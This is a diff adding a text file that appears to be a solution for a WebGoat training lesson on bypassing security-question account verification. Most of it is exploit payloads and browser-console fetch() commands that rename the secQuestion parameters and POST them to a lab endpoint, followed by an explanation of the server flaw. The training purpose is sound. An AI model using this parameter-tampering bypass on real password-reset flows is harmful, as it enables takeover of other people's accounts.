@@ -1,0 +1,122 @@
+====================================================================
+2FA PASSWORD RESET BYPASS - COMPLETE SOLUTION
+====================================================================
+
+ACTUAL REQUEST FORMAT (from form submission):
+----------------------------------------------
+secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+REQUIRED PARAMETERS:
+--------------------
+✅ secQuestion0 and secQuestion1 (the security questions - RENAME THESE!)
+✅ jsEnabled=1 (JavaScript enabled flag)
+✅ verifyMethod=SEC_QUESTIONS (verification method)
+✅ userId=12309746 (your user ID - may vary)
+
+====================================================================
+WORKING SOLUTION:
+====================================================================
+
+PAYLOAD 1: Rename to secQuestion2 and secQuestion3
+---------------------------------------------------
+secQuestion2=anything&secQuestion3=anything&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+PAYLOAD 2: Rename to secQuestion1 and secQuestion2 (skip 0)
+------------------------------------------------------------
+secQuestion1=test&secQuestion2=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+PAYLOAD 3: Empty values with renamed parameters
+------------------------------------------------
+secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+====================================================================
+BROWSER CONSOLE COMMANDS:
+====================================================================
+
+TRY THIS FIRST:
+---------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=bypass&secQuestion3=attack&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+
+ALTERNATIVE (skip 0, use 1 & 2):
+----------------------------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion1=test&secQuestion2=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+
+EMPTY VALUES VERSION:
+---------------------
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+IF USERID IS DIFFERENT:
+====================================================================
+
+Check your form to get the correct userId value:
+1. Press F12 in WebGoat
+2. Go to "Elements" or "Inspector" tab
+3. Find the form with security questions
+4. Look for hidden input with name="userId"
+5. Copy the value
+6. Replace 12309746 in the command above
+
+Or use this dynamic version:
+
+const userId = document.querySelector('input[name="userId"]').value;
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: `secQuestion2=bypass&secQuestion3=attack&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=${userId}`
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+HOW THE BYPASS WORKS:
+====================================================================
+
+Original (what server expects):
+  secQuestion0=answer1
+  secQuestion1=answer2
+  jsEnabled=1
+  verifyMethod=SEC_QUESTIONS
+  userId=12309746
+
+Bypass (what you send):
+  secQuestion2=anything    ← RENAMED from secQuestion0
+  secQuestion3=anything    ← RENAMED from secQuestion1
+  jsEnabled=1              ← KEEP SAME
+  verifyMethod=SEC_QUESTIONS ← KEEP SAME
+  userId=12309746          ← KEEP SAME
+
+Server logic flaw:
+  Checks: "Did I receive 2 security question parameters?" ✓
+  BUT doesn't check: "Are they secQuestion0 and secQuestion1?" ❌
+  
+Result: Bypass successful! 🎉
+
+====================================================================
+EXPECTED RESPONSE:
+====================================================================
+
+Success:
+{
+  "lessonCompleted": true,
+  "feedback": "Congratulations! You successfully bypassed the 2FA",
+  "output": "Account verified"
+}
+
+====================================================================
